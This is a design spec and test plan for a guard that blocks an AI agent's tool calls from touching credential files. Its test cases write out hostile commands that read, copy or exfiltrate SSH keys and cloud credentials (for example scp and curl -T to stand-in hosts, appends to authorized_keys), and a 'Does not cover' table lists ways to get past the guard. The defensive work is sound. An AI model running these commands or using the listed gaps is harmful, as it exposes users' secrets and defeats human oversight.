| `*/id_rsa`, `*/id_dsa`, `*/id_ecdsa`, `*/id_ed25519` | extension (keys outside `~/.ssh`) | A28 |
| `*/.openharness/*` | **not ported** — OpenHarness's own stores, not ours | A14 |

`fnmatch` `*` also matches `/`, so every pattern is effectively "path contains `/<segment>`…" — this is what lets
`~user/.ssh/x`, `$HOME/.aws/credentials` and `host:~/.ssh/id_rsa` match even before expansion.

### Behaviour (claims → Authority List)
- **Matching** (`sensitive_rule`; `is_sensitive_path` wraps it):
  0. Caps (A33): if `len(raw) > max_chars` → `path-too-long` without expanding. After step 1, if
     `len(s) > max_chars` → `path-too-long`. `max_chars` is `PATH_MAX_CHARS` (4,096) for path arguments and
     `MAX_COMMAND_CHARS` (10,000) for command words. Step 3 is skipped when `len(s) > PATH_MAX_CHARS`.
  1. Expand: `s = os.path.expandvars(os.path.expanduser(raw))` (A11).
  2. Lexical form: `t = s.replace("\\", "/")`. If segment 0 is `x:rest` (a one-letter drive followed by more
     text, e.g. `C:.aws`), split it into `x:` and `rest` (A39). Then per `/`-segment, except `.` and `..`:
     - drop any `:<stream>` suffix (everything from the first `:`), except a lone drive `x:` in segment 0;
     - strip trailing dots and spaces.

     Then `posixpath.normpath` (A18, A19, A34). Example: `C:\Users\a\_netrc::$DATA` → `c:/users/a/_netrc`.
  3. **The lexical forms (steps 2 and 4) are matched first.** A hit returns `sensitive-path` with no walk and
     no charge. Only then, when `resolve` and `len(s) <= PATH_MAX_CHARS`, is the resolved form computed with
     `_sp.realpath_bounded(s, scan)` (A11, A40, A42):
     - relative `s` is prefixed with `os.getcwd()`;
     - components are processed from a deque; **every** popped component costs 1 from
       `scan.components_left`, including those pushed from a symlink target;
     - a symlink is read with `os.readlink(name, dir_fd=fd)`. It counts toward `MAX_SYMLINKS` (40), and its
       target's components are pushed to the front (an absolute target restarts at `/`);
     - `..` pops a part and moves the fd with `os.open("..", dir_fd=fd)`;
     - a directory is entered with `os.open(name, O_RDONLY|O_DIRECTORY|O_NOFOLLOW, dir_fd=fd)`, so each
       component is O(1) syscalls whatever the depth;
     - a missing component, or a non-directory with names after it, switches to lexical appending until a
       `..` climbs back above it.

     Exceeding either limit → `path-budget`. The result equals `os.path.realpath` on the equivalence corpus.
  4. Each form is casefolded (A17) and prefixed with `/` if relative (so `.netrc` and `id_rsa` match `*/…`). Each is
     then split into `rstrip("/")` and `+"/"` forms, so a directory root like `~/.ssh` or `~/.ssh/` matches
     `*/.ssh/*` (A10).
  5. Deny if **any** form matches `_PATTERN_RE`: one regex compiled once at import from
     `"|".join(fnmatch.translate(p) for p in SENSITIVE_PATH_PATTERNS)`. It has the same semantics as
     `fnmatchcase` per pattern (A13, A19). This is an implementation choice, not a performance requirement: with
     the memo, a per-pattern loop also meets every limit (judge r3). The regex is one call per form instead of 18,
     and an equivalence test pins it (A37).
- **Fail closed**: any exception in expand/normalise/resolve/match → treated as sensitive (A20). (Python raises
  `ValueError` for an embedded NUL in `resolve`.)
- **Path arguments** (`_guard`): for every dict key whose casefold is in `PATH_ARG_KEYS`, take a `str` value, or each
  `str` in a `list`/`tuple` value.
  1. `_guard`'s body runs inside `with _sp.call_scope() as scan:` (one `Scan` per call). For each value, it looks
     it up in `scan.path`, else calls `_sp.sensitive_rule(value, resolve=True, max_chars=_sp.PATH_MAX_CHARS)`
     and stores the result. The raw and expanded lengths are both capped before anything is resolved
     (A33). Resolves draw on the call's component budget (A40).
  2. A non-None result is the denial rule (`path-too-long`, `path-budget` or `sensitive-path`).
  3. Command values under `COMMAND_ARG_KEYS` go through the unchanged `_check_value` →
     `check_command(value, policy)` → `check_rule` → `_check(depth=0)`. Its `call_scope()` finds the `Scan`
     that `_guard` set and reuses it without owning it. One tool call therefore has one budget, however many
     keys it uses, with no new keyword (A41).

  The value is still pushed for the existing nested scan. Non-string leaves under a path key are ignored
  (nothing to resolve) (A12, A23).
- **Command strings** — a rule inside `check_rule`. The first statement of `segment_rule(words, state)` (before
  `strip_wrappers`, so assignment words like `K=~/.ssh` and wrapper arguments are seen, and before the `cd` branch at
  :307) is:
  `scan = _sp.current_scan()` (always set: `_check(depth=0)` opened the scope); for each `w` in `words`:
  `r = scan.cmd[w]` if cached, else `_sp.sensitive_rule(w, resolve=_pathish(w), max_chars=MAX_COMMAND_CHARS)`,
  stored in `scan.cmd` (the key is the word alone, because `resolve` and `max_chars` follow from it);
  return the first non-None `r`. Only then does `strip_wrappers` run (A38).
  - `_pathish(w)` is true when `w` contains `/` or `\`, or starts with `~`, `.` or `$` (A35).
  - **Memo (A36):** one `Scan` per top-level call: per `_guard` call, or per direct `check_rule`/`check_command`
    call. `_check(depth=0)` opens `call_scope()`; nested `_check` calls, both streams and every payload read the
    same `Scan` through the ContextVar. So a word is matched at most once per call, however often unquoted nesting
    re-scans it. It is never stored at module level and never cached across calls, so a filesystem change
    between two tool calls is seen (two-call symlink test, mutation 11).
  - Redirect targets are words (`segments` :409-411), so `echo x >> ~/.ssh/authorized_keys` is checked (write
    direction).
  - It runs for every segment of **both** streams (`_check` :482-485), so POSIX-only spellings like
    `cat ~/.a"w"s/credentials` and `cat ~/.a\ws/credentials` are caught by the POSIX stream, and Windows
    backslash paths by the non-POSIX stream (A15, A18).
  - It also runs on every inline payload: `_inline_rule` re-enters `_check(payload, depth + 1, sensitive)` for
    `sh/bash/... -c`, `cmd /c`, PowerShell `-Command` prefixes and `eval` (:285-296). So
    `bash -c 'cat ~/.a"w"s/credentials'`, `bash -c "cat ~/.a\ws/credentials"`, `sh -c 'cat ~/.n\etrc'` and
    `eval 'cat ~/.a"w"s/credentials'` are re-lexed and caught at depth 1 (A15).
  - Nesting deeper than `MAX_DEPTH` is already denied (`nesting-too-deep`, :470).
- **Not overridable** (A1, A9, A21): `SENSITIVE_PATH_PATTERNS` is a module constant; neither `CommandPolicy`, mode,
  `SubagentConfig`, `run_team` nor any argument reads or extends it. Ordering proof:
  - `check_command` has exactly two allow exits: `return None` at `safety.py:523` (denylist mode) and `:535`
    (allowlist passed). `sensitive-path` is returned by `check_rule` at :519, so both allow exits are reachable
    only when no segment, at any depth, matched.
  - The allowlist can only *deny* (`:528-534`).
  - Path-key checks in `_guard` never consult `policy`.
  - `_both` (`subagent.py:114-116`) evaluates the parent guard first and a child guard can only add denials, so a
    sub-agent or team member cannot remove it.
  - **Allowlist entries that bypass it today** (finding 1, each becomes a pinned test, A21): `cat`, `cp`, `scp`,
    `rsync`, `tar`, `base64`, `git` (`git -C ~/.ssh`), `grep`; by the same mechanism any allowlisted reader/copier
    (`less`, `head`, `tail`, `xxd`, `zip`, `curl -T`/`--data @file`, `python3` with a literal path). The rule is
    name-agnostic and checks every word, so the same line closes all of them.
- **Denial text** (A22): `_denial("sensitive-path")` → `Blocked by safety policy (rule sensitive-path): touches a
  credential or key location (...). Use a path inside the workspace, or ask Daniel to run it manually.` It contains
  neither the path, the command, nor the matched pattern (the source echoes both, `checker.py:95-96`; we do not).
  `path-too-long` uses the same `_denial` and echoes nothing either.

### Does not cover (honest limits — tripwire, not a sandbox)
| gap | example | why not |
|---|---|---|
| String building / concatenation inside an interpreter | `python3 -c "p='~/.s'+'sh/id_rsa'; ..."` | no evaluator; literal paths in one-liners *are* caught incidentally (the path is a substring of the payload word) |
| Env-var or shell-variable indirection that splits the segment | `D=.ss; cat ~/${D}h/id_rsa` | expansion of command-local vars needs a shell |
| Globs | `cat ~/.ss?/id_*`, `cat ~/.*/credentials` | glob expansion happens in the shell |
| Brace expansion | `cat ~/.a{w,}s/credentials` | `shlex` does not expand braces; the word stays `~/.a{w,}s/credentials` |
| ANSI-C quoting | `cat ~/$'\x2e'aws/credentials` | `shlex` does not decode `$'...'` escapes |
| Encoded paths | `cat $(echo fi8uc3NoL2lkX3JzYQ== \| base64 -d)` | `computed-command-name` catches some; not all |
| Windows 8.3 short names | `type C:\Users\a\AWS~1\credentials`, `SSH~1\id_rsa` | short names are assigned by the filesystem; only the host knows them |
| Windows hosts at all (UNC/SMB risk) | `Path(r"\\host\share\x").resolve()` on Windows opens a UNC path, so the guard itself would make an outbound SMB connection (NTLM hash leak) | hosts are Linux-only today (CI is ubuntu). Before supporting Windows hosts, never `resolve` a word starting with `\\` or `//` (lexical form only) and add a test |
| Recursive reads/copies of an ancestor | `grep -r BEGIN ~`, `tar czf x.tgz ~`, `cp -r ~ dst` | denying `~` breaks normal work |
| Implicit credential use | `aws s3 ls`, `kubectl get pods`, `gh api`, `git push` over SSH, `ssh host` | protects files, not their use by tools |
| Hard links | hardlink in the workspace to `~/.ssh/id_rsa` | `resolve()` cannot see hard links |
| Bare-name symlinks inside a command | `cat creds` where `creds -> ~/.aws/credentials` in the host cwd | command words without `/`, `\`, `~`, `.`, `$` are matched lexically only (A35); path *arguments* are always resolved |
| Command words that expand to 4,097-10,000 chars | `cat "./"*2100notes` where `notes` is a symlink | such words get the lexical form only (no walk). The kernel rejects paths over 4,096 chars (`ENAMETOOLONG`), so `cat`/`open` cannot reach the link. A tool that normalises the string before opening it could. Listed rather than denied: long pathish words (`python3 -c` scripts containing `/`) are common |
| Non-Linux hosts for the walk | `O_DIRECTORY`/`dir_fd` semantics | the walk relies on POSIX `*at` calls (`os.supports_dir_fd`); hosts are Linux-only today |
| TOCTOU | symlink created after the guard ran, or by a previous step of the same command (`ln -s ~/.ssh k; cat k/id_rsa` is caught only by the literal `~/.ssh` word) | guard is pre-execution |
| Path args under unlisted keys | MCP tool with `{"location": "/root/.ssh/id_rsa"}` | key-based, like the source (`query.py:1026`); free-text keys (`text`, `content`) are deliberately not scanned |
| Callers that bypass the shared guard | `AgentLoop(guard=None)` (`loop.py:152`); root `SubagentConfig(guard=<custom>)`; `run_team(..., guard=<custom>)` (team.py:567) where the custom guard is not built from `guard_tool_call`/`make_guard` | composition is opt-in at the root |
| MCP server launch argv | `StdioServer(command=("kube-mcp", "--kubeconfig", "~/.kube/config"))` | deliberate opt-out (A31). If launch config ever becomes model- or workspace-writable, this exemption is a hole: remove the keyword then |
| Credential stores not in the list | `~/.config/gh/hosts.yml`, `%APPDATA%\gcloud`, `.env` files, browser profiles, OS keychains | add with a reason and a test when needed |
| Container-side paths | inside the docker sandbox, a command's paths refer to the container FS | lexical form still applies; resolved form is host-relative |

**Known false positives (accepted):** any word containing a sensitive segment is denied even as plain text in a
command, e.g. `echo "~/.ssh/config"` or a commit message quoting `/home/x/.aws/credentials`; a project-level
`.npmrc`, `.ssh/` or `id_rsa` inside the workspace is not editable by the agent; `~/.SSH/x` on case-sensitive
Linux is a different folder but is denied; a POSIX file literally named `_netrc.` or `.ssh:notes/x` is matched after
stripping. A path argument over 4,096 characters (raw or after `$VAR` expansion), or a command word that expands past
10,000, is denied even if harmless: Linux `PATH_MAX` is 4,096, so the
call could not open it on Linux anyway. A path that follows more than 40 symlinks, and any symlink loop, is denied
(`path-budget`); the kernel would fail such a path with `ELOOP` anyway. A legitimately symlinked workspace (a
symlink to the workspace, or symlinked folders inside it) passes while each path follows ≤ 40 links and the call
stays within the budget. A single call whose walk would visit more than 16,384 path components (symlink-target
components and the cwd prefix of relative paths included) is
denied (`path-budget`) even if every path is harmless. For example, a path-argument list of about 2,700 typical
6-segment paths, or a 10k-char command made almost entirely of `/`-dense words behind several quoted
`bash -c` levels. Split the call.

### Proof
- `python -m pytest tests/test_sensitive_paths.py -q` — all pass.
- `python -m pytest tests/test_safety.py tests/test_workspace.py tests/test_modes_sub.py tests/test_modes.py tests/test_mcp_client.py tests/test_docker_engine.py -q`
  — unchanged and still pass **provided the matcher is built as specified**, which needs the per-call `Scan`
  memo, the caps, the component budget, the bounded walk, and the ContextVar sharing (no new keyword on
  `check_command`). Rev-5 simulation, 3 runs: 294 passed, 5 skipped each time, T41 included.
  The rev-4 figures that follow are kept for the audit trail. Simulated rev 4: 294 passed, 5 skipped in 6 of 7 runs. The seventh
  run had 1 failure on a loaded box (28 s wall time); the test was not captured, and three re-runs were clean.
  `test_adversarial_inputs_are_linear`: worst 0.073-0.084 s (limit 0.25), first-19 0.46-0.52 s (limit 1.0).
- `python -c "from master_finhub.tools.safety import check_command as c; print(c('bash -c \'cat ~/.a\"w\"s/credentials\''))"`
  prints a line containing `rule sensitive-path` and not `credentials`.

### Test plan (`tests/test_sensitive_paths.py`, synthetic data, `monkeypatch.setenv("HOME", tmp_home)`)
**Per pattern — denied as a path arg `{"path": X}` and as `cat X`** (parametrised):
`~/.ssh/id_rsa`, `~/.ssh/config`, `~/.aws/credentials`, `~/.aws/config`, `~/.aws/sso/cache/a.json`,
`~/.config/gcloud/application_default_credentials.json`, `~/.azure/accessTokens.json`, `~/.gnupg/secring.gpg`,
`~/.docker/config.json`, `~/.kube/config`, `~/.netrc`, `~/_netrc`, `~/.npmrc`, `~/.pypirc`, `~/.git-credentials`,
`/srv/keys/id_rsa`, `/srv/keys/id_dsa`, `/srv/keys/id_ecdsa`, `/srv/keys/id_ed25519`.

**Variants — all denied:**
- dir roots / trailing slash: `ls ~/.ssh`, `ls ~/.ssh/`, `cd ~/.ssh`, `{"root": "~/.ssh"}`, `cp -r ~/.aws /workspace/x`, `cp -r ~/.docker x`, `cp -r ~/.kube x`
- home spellings: `$HOME/.aws/credentials`, `${HOME}/.ssh/id_rsa`, `~client_a/.ssh/id_rsa`, `%USERPROFILE%\.ssh\id_rsa`
- traversal: `/workspace/../root/.ssh/id_rsa`, `{"path": "a/../../.ssh/id_rsa"}`, relative `.ssh/id_rsa`, bare `id_rsa`, `.netrc`
- case: `~/.SSH/ID_RSA`, `~/.Aws/Credentials`
- **lexical-only (A19 killing tests)**: `{"path": "C:\\Users\\client_a\\.aws\\credentials"}` and the command `type C:\Users\client_a\.ssh\id_rsa`. On a POSIX host both resolve to a single name `<cwd>/C:\Users...` that no pattern matches, so only the lexical form denies. (`{"file_path": "c:/users/client_a/_netrc"}` stays as coverage but is **not** a killing test: its resolved form `<cwd>/c:/users/client_a/_netrc` still matches `*/_netrc`.)
- Windows command: `type C:\Users\client_a\.ssh\id_rsa`
- **Windows suffixes (A34)**: `type C:\Users\client_a\_netrc.`, `type C:\Users\client_a\_netrc::$DATA`, `type C:\Users\client_a\.git-credentials.`, `{"path": "C:\\Users\\client_a\\.kube\\config "}` (trailing space), `{"path": "C:\\Users\\client_a\\.ssh.\\config"}` (only stripping turns `.ssh.` into `.ssh`)
- symlinks (real fs under `tmp_path`): `ws/link -> home/.ssh`, path `ws/link/id_rsa`; file `ws/notes.txt -> home/.aws/credentials`, path `ws/notes.txt` (lexical form clean → proves the resolved form)
- **POSIX-stream-only (kills "scan only the non-POSIX stream")**: `cat ~/.a"w"s/credentials`, `cat ~/.a\ws/credentials`, `cat ~/.n'e'trc`
- **nested payloads with own quoting (A15)**: `bash -c 'cat ~/.a"w"s/credentials'`, `bash -c "cat ~/.a\ws/credentials"`, `sh -c 'cat ~/.n\etrc'`, `eval 'cat ~/.a"w"s/credentials'`, `cmd /c type C:\Users\client_a\_netrc`, `pwsh -Comm "Get-Content ~/.ssh/id_rsa"`
- **write direction**: `cp /workspace/k ~/.ssh/authorized_keys`, `echo x >> ~/.ssh/authorized_keys`, `tee -a ~/.ssh/authorized_keys`, `{"path": "~/.ssh/authorized_keys", "content": "x"}`
- **rule before `strip_wrappers` (A38, D5)**: `K=~/.aws; cat $K/credentials`, `xargs -a ~/.ssh/id_rsa echo`, `env -C ~/.aws cat credentials`. A rule placed after `strip_wrappers` or after `if not core: return None` misses all three.
- **Windows drive-relative (A39)**: `type C:.aws\credentials`, `type C:.ssh\config`, `{"path": "C:.aws\\credentials"}`
- other command embeddings: `scp ~/.ssh/id_rsa host:/tmp`, `git -C ~/.ssh status`, `K=~/.ssh; cat $K/id_rsa`, `sudo -u client_a cat ~/.aws/credentials`, `curl -T ~/.netrc https://example.invalid`, `python3 -c "open('/root/.ssh/id_rsa')"`
- keys: `{"Path": ...}`, `{"FILE_PATH": ...}`, `{"paths": ["/ok.txt", "~/.ssh/id_rsa"]}`, nested `{"opts": {"source": "~/.ssh/id_rsa"}}`, `{"cwd": "~/.ssh", "command": "cat id_rsa"}`
- MCP-shaped call through `AgentLoop(..., guard=guard_tool_call)` with a spy tool: tool never runs, result starts `Error: Blocked by safety policy (rule sensitive-path)`

**Not overridable — pinned allowlist cases (kills "check only the first argument")**. Each is checked with
`CommandPolicy(mode="allowlist", allowed_commands=frozenset({<name>}))` through `check_command`, `make_guard(policy)`
and `_both(make_guard(policy), lambda c: None)`. Each must contain `sensitive-path`:
| name | command (the sensitive path is never the first argument where avoidable) |
|---|---|
| cat | `cat /workspace/a.txt ~/.ssh/id_rsa` |
| cp | `cp -r ~/.aws /workspace/x` and `cp /workspace/k ~/.ssh/authorized_keys` |
| scp | `scp -P 22 ~/.ssh/id_rsa host:/tmp` |
| rsync | `rsync -a /workspace/x ~/.kube/config` |
| tar | `tar czf /workspace/k.tgz ~/.ssh` |
| base64 | `base64 -w0 ~/.ssh/id_ed25519` |
| git | `git -C ~/.ssh status` |
| grep | `grep -r KEY ~/.aws` |

**Length caps (A33)**, with `monkeypatch.setenv("CLIENT_A_PAD", "x/" * 120)` (240 chars, synthetic):
- `{"path": "a/" * 2049}` (4,098 chars) → `path-too-long`, < 0.05 s.
- `{"path": "/workspace/" + "a" * 4000}` (≤ 4,096) → `None`.
- `{"path": "a/" * 200_000}` → `path-too-long`, < 0.05 s.
- **Expansion:** `{"path": "$CLIENT_A_PAD" * 300}` (3,900 raw chars, 72,000 expanded) → `path-too-long`, < 0.05 s.
- **List of N:** `{"paths": ["$CLIENT_A_PAD" * 300] * 10}` → `path-too-long`, < 0.1 s total.
- **Command word:** `check_rule("cat " + "$CLIENT_A_PAD" * 700)` (< 10,000 raw, 168,000 expanded) → `path-too-long`, < 0.05 s.

**Command-scan cost (A35, A36, A40).** Each vector is truncated to 10,000 chars and uses
`monkeypatch.setenv("CLIENT_A_PAD", "x/" * 120)` and `monkeypatch.setenv("CLIENT_A_DIRS", "/usr/lib:" * 25)`
(225 chars with 50 `/`, standing in for a host `PATH`). Three checks per vector:
- **(i) absolute tripwire:** `check_rule(v)` < 0.5 s, returning the stated rule;
- **(ii) increment, same host:** run `check_rule(v)` and `check_rule(v, sensitive_paths=False)` **interleaved**,
  7 times each (on, off, on, off, …), and require min(on) − min(off) < 0.1 s. Seven, because on this box the
  per-run spread of a single vector reached 0.1 s (e.g. 0.195-0.297 s). Interleaving cancels load drift between
  the two series, and the minimum of 7 has been stable to ±0.01 s in my runs. The limit is not loosened. Measured
  worst +0.030 s, a margin of 0.07 s;
- **(iii) single level** (no `bash -c`/`eval` prefix): `check_rule(v)` < 0.25 s, the module's existing worst-vector budget.
| vector | expect |
|---|---|
| `"bash -c "*3 + "./a "*2490` | `None` |
| `"bash -c "*3 + "~ "*4980` | `None` |
| `"eval "*3 + "./a "*2490` | `None` |
| `"bash -c "*3 + "a "*4980` | `None` |
| `"cat " + "$CLIENT_A_PAD"*700` | `path-too-long` |
| `"bash -c "*3 + "cat " + "$CLIENT_A_PAD "*600` (each word expands to 240 chars) | `None` |
| `"bash -c "*3 + "cat " + "$CLIENT_A_PAD"*600` (one word, 144,000 expanded) | `path-too-long` |
| `" ".join(f"./{i}" for i in range(1500))` | `None` |
| `"cat " + " ".join("./" + "$CLIENT_A_DIRS/"*18 + str(i) for i in range(2000))` (distinct words just under 4,096 expanded) | `path-budget` |
| `"bash -c "*3 + ` the same | `path-budget` |
| `"echo " + " ".join("./$CLIENT_A_DIRS/"*17 + str(i) for i in range(2000))` | `path-budget` |
| `"echo " + " ".join("./$CLIENT_A_DIRS/"*18 + str(i) for i in range(2000))` (4,104 expanded: lexical only) | `None` |

Why check (i) is 0.5 s: today's code already takes 0.19-0.25 s on the nested `"a "`/`"~ "` vectors (judge r3,
and my runs). A 0.25 s absolute limit would be flaky for reasons unrelated to OH31. Check (ii) is the honest
measure of the new rule's cost. It is host-relative because both runs happen on the same host in the same test.
Check (iii) holds every single-level vector to the module's own 0.25 s. The existing
`test_adversarial_inputs_are_linear` keeps its limits unchanged.

**Budget (A40):**
- `{"paths": ["./" + "$CLIENT_A_DIRS/"*18 + str(i) for i in range(2000)]}` → `path-budget` in < 0.25 s (judge
  measured 5.7 s with no budget).
- `{"paths": [f"/workspace/proj/src/mod{i}/file{i}.py" for i in range(2000)]}` → `None`.
- One `_guard` call with
  `{"paths": [f"/workspace/proj/src/mod{i}/file{i}.py" for i in range(2500)], "command": "ls " + " ".join(f"./a/b/c{i}" for i in range(500))}`
  → `path-budget`. This proves the path branch and the command branch draw on one shared budget: 2,500 × 6 =
  15,000 components plus 500 × 4 = 2,000 makes 17,000, while neither alone exceeds 16,384. The same two values
  in separate calls → `None` each.
- A boundary test with `monkeypatch.setattr(sensitive_paths, "RESOLVE_COMPONENT_BUDGET", 10)` (read when
  `Scan()` is created, via the `default_factory`): absolute, non-existent paths so the cwd prefix does not count,
  `check_rule("cat /a/b /c/d /e/f")` → `None` (3 × 3 = 9 components: root, `a`, `b`), and
  `check_rule("cat /a/b /c/d /e/f /g/h")` → `path-budget` (12 > 10).

**Symlink amplification (A40, A42, mutations 13 and 14).** All fixtures are synthetic, under `tmp_path`; cwd is
the fixture dir. Each case must give `path-budget` in < 0.25 s:
- **chain:** 500 symlinks `c{i} → "x/../"*700 + "c{i+1}"` (last → `x`). Cases: `check_rule("cat ./c0")`; one
  command of 20 spellings `"./" + "./"*k + "c0"`, k < 20 (483 chars); `guard_tool_call` with those 20 as
  `{"paths": [...]}`.
- **flat:** 1,300 symlinks named `aa`, `ab`, … each → `"/".join(["x", ".."] * 800)`. Cases: one word
  `"./" + "/".join(names)` cut to ≤ 4,096 chars; 11 path args built from it.
- **deep existing tree:** 1,000 nested `d/` directories (built with `dir_fd`) plus a symlink `L` to the deepest.
  Cases: 30 path args `"./"*i + deep + "/f{i}"`, and 2,000 path args `f"L/{'./'*i}f{i%30}"`. The no-fd
  (whole-prefix `lstat`) mutant takes ~0.5 s here; `Path.resolve` takes 0.5 s and 4.6 s.

**Symlink cap and legitimate symlinks:**
- 40-link chain to a regular file → `None`.
- 41-link chain → `path-budget`.
- Loop `a → b → a` → `path-budget`.
- Symlinked workspace: `link1 → real`, `link2 → link1/sub`, `link3 → <abs>/link2/deep`.
  `cat ./link3/f.txt ./link1/sub/deep/f.txt` → `None`, and `{"path": "link3/f.txt"}` → `None`.
- A symlink inside the workspace to `$HOME/.aws/credentials` → `sensitive-path` (A11, unchanged).

**Walk equivalence (A42):** fixture tree with relative, absolute, dangling and `x/up → y/..` symlinks. For 2,000
seeded random paths built from the names, each tested relative and absolute,
`realpath_bounded(p, Scan()) == os.path.realpath(p)`.

**Budget isolation (A41, mutation 14):**
- **Sequential:** two `guard_tool_call`s, each `{"paths": [180 distinct 51-component absolute paths]}` (9,180
  components each, different paths in each call so the memo cannot hide the charge) → `None`, `None`.
- **Sequential, command form:** with `RESOLVE_COMPONENT_BUDGET` patched to 6,000, two `check_rule` calls of 96
  distinct 51-component words each (4,896 components, < 10,000 chars) → `None`, `None`.
- **Threads:** two `threading.Thread`s released together by a `Barrier`, each making 20 such `guard_tool_call`s
  with thread-distinct paths → all `None`.
- **Nested:** inside a `_guard` call, the command branch's `check_rule` reuses the same `Scan` (the shared-budget
  case above) and does not reset it. After the call, `_sp.current_scan() is None`.
- **T41 unchanged:** `tests/test_modes.py::test_empty_string_denial_blocks` passes unmodified.

**Two calls do not share a memo (A36, mutation 11).** Under `tmp_path`, with `HOME` set to a temp home holding
`.aws/credentials` and cwd set to `ws/`:
1. `ws/notes.txt` is a regular file: `check_rule("cat ./notes.txt")` → `None`.
2. Replace it with a symlink to `$HOME/.aws/credentials`. The identical second `check_rule("cat ./notes.txt")` →
   `sensitive-path`.
3. Repeat through `guard_tool_call` with `{"command": "cat ./notes.txt"}` and with `{"path": "notes.txt"}`
   (the path memo is per call too).

Simulated: call 1 `None`, call 2 `sensitive-path`.
**Memo kill test (mutation 10):** `monkeypatch.setattr(sensitive_paths, "sensitive_rule", counting_wrapper)`.
This works because safety.py always calls `sensitive_paths.sensitive_rule(...)` through the module.
`check_rule("bash -c " * 3 + "./a " * 100)` calls it **at most twice** with `"./a"` (once per `resolve` flag
value at most), not 30+ times.

**Direct callers (A31, A32):**
- MCP launch: `check_command(shlex.join(("kube-mcp", "--kubeconfig", "~/.kube/config")), sensitive_paths=False) is None`.
- MCP launch, live: `McpClient(StdioServer(name="kube", command=(sys.executable, STUB, "~/.kube/config"))).start()`
  does **not** raise `McpError` (the stub ignores unknown argv; close it after).
- MCP launch, unchanged: `test_denied_launch_command_never_spawns` (`rm -rf /`) still raises.
- The default is on: `check_command("cat ~/.kube/config")` contains `sensitive-path`.
- AST scan test (rev 4; prototyped in `scratchpad/sim/astscan.py`). The test file holds a function
  `scan_source(src: str, rel: str) -> tuple[list[tuple[str, int]], int]` (violations, allowed count). It runs on
  every `src/master_finhub/**/*.py` except `tools/safety.py`. Let `KW = {"sensitive_paths", "sensitive", "scan",
  "memo"}` and `PRIV = {"_check", "_check_tokens", "_inline_rule", "segment_rule", "_State"}`.
  - (a) **Every** `ast.Call`, whatever its callee (this catches aliases, `functools.partial`, `getattr(...)(...)`
    and `dict(...)`): any keyword whose `arg` is in `KW` is a violation. The one exception is in
    `tools/mcp/client.py`: `arg == "sensitive_paths"` with an `ast.Constant` value whose `.value is False`. That
    exception is counted, and the tree-wide count must be **exactly 1**.
  - (b) Any string constant equal to `"sensitive_paths"` or to a `PRIV` name outside `tools/mcp/client.py` is a
    violation (catches `**{"sensitive_paths": False}` and `getattr(safety, "_check")`).
  - (c) **Only names bound to the safety module** count:
    - `import master_finhub.tools.safety [as X]` and `from master_finhub.tools import safety [as X]` bind the
      module.
    - Violations: an `ast.Attribute` with `attr` in `PRIV` on such a name, or on the dotted
      `master_finhub.tools.safety`; any `getattr(<such name>, ...)`; and any `from master_finhub.tools.safety
      import <PRIV name>`.
    - Unrelated `self._check` / `bus._check()` (sandbox/workspace.py:120/146/149,
      orchestration/message_bus.py:322/373) are **not** violations.
  - **Tree assertion:** zero violations, allowed count 1.
  - **Negative tests**, each a source string run through `scan_source`; each must produce ≥ 1 violation:
    1. `from master_finhub.tools.safety import check_command as cc; cc("x", sensitive_paths=False)`
    2. `functools.partial(check_command, sensitive_paths=False)`
    3. `getattr(safety, "check_rule")("x", sensitive_paths=False)`
    4. `check_command("x", sensitive_paths=0)`
    5. `check_command("x", **{"sensitive_paths": False})`
    6. `from master_finhub.tools.safety import _check; _check("x", 0, False)`
    7. `from master_finhub.tools import safety; safety._check("x")`
    8. `getattr(safety, "_check")("x")`
    9. `import master_finhub.tools.safety; master_finhub.tools.safety._State(0)`
    10. `check_rule("x", scan=None)`
    11. `check_command("x", sensitive_paths=0)` with `rel="tools/mcp/client.py"`
  - **Positive tests**, each with zero violations: `class W: def f(s): return s._check(1)`, `bus._check()`, and
    `check_command("x", sensitive_paths=False)` with `rel="tools/mcp/client.py"` (allowed count 1).
  - Simulated: today's tree plus the planned client.py line → 0 violations; all 11 negatives flagged; all 3
    positives clean.
- Docker engine: with `subprocess.Popen` patched to raise (as in tests/test_docker_engine.py:93),
  `DockerEngine(...).stream("cat ~/.ssh/id_rsa")` and `.run(...)` raise `CommandBlocked`, and the message contains
  `sensitive-path` and not `id_rsa`.

**Fail closed:**
- `{"path": "/workspace/a\x00b"}` is denied (ValueError in `resolve`).
- With `monkeypatch.setattr(Path, "resolve", raiser)`, `{"path": "/workspace/ok.txt"}` is denied.
- With `monkeypatch.setattr(sensitive_paths, "sensitive_rule", boom)`, `check_command("ls ./x")` is denied
  (`check-failed`, via `check_rule`'s fail-closed :491-494), and `guard_tool_call` with `{"path": "ok.txt"}` is
  denied (`check-failed`, via `_guard`'s fail-closed :564-565). This works because safety.py calls through the
  module.

**No echo:** for `{"path": "/root/.ssh/client_a_key"}`, `cat ~/.aws/credentials_acct_001` and the 4,098-char path,
the denial contains none of `client_a`, `acct_001`, `.ssh`, `.aws`, `*/`, `aaaa`.

**Must still pass (return None):**
- Paths: `/workspace/ssh_notes.txt`, `/workspace/.ssh-docs/readme.md`, `/workspace/docs/aws-credentials-howto.md`,
  `/workspace/id_rsa.pub`, `/workspace/.netrc.example`, `/workspace/known_id_rsa_fingerprint.txt`,
  `/workspace/proj/.docker/compose.yml`, `~/.sshrc`, `~/.ssh/../notes.txt`, `/workspace/report.v1.`.
- Commands: `git status`, `ls -la`, `cat README.md`, `ls ~/.ssh-docs`, `git commit -m "add .ssh/ to gitignore"`,
  `python -m json.tool data.json`, `scp report.csv host:/tmp/`, `type C:\Users\client_a\notes.txt.`, `cat c:/x`,
  `cat a:b/.ssh-x`, `env -C /workspace cat notes.txt`.
- Free text: `{"text": "how do I set up ~/.ssh/config?"}` (echo's key is not scanned).
- Every case in `tests/test_safety.py::test_allowed_commands` and the full existing suites.

### Mutation targets for boundary-qa (each must turn at least one test red)
1. **Ordering**: move the `sensitive-path` rule below the `cd` branch, or add a `policy.mode` condition around it →
   `cd ~/.ssh` (resp. the pinned allowlist table) passes.
2. **Fail open**: change `sensitive_rule`'s `except Exception: return "sensitive-path"` to `return None` → the NUL-byte
   and patched-`resolve` tests fail.
3. **Resolved form only**: drop the lexical form from `match_forms` → the A19 Windows path-argument tests fail.
   **Lexical form only**: drop the resolved form → the symlink tests fail.
4. **Non-POSIX stream only**: skip the POSIX stream in the sensitive rule → `cat ~/.a"w"s/credentials` passes.
5. **First argument only**: check only `words[1]` → `cat /workspace/a.txt ~/.ssh/id_rsa` and `grep -r KEY ~/.aws`
   pass.
6. **No recursion**: pass `sensitive=False` (or drop the flag) in `_inline_rule`'s re-entry →
   `bash -c 'cat ~/.a"w"s/credentials'` passes.
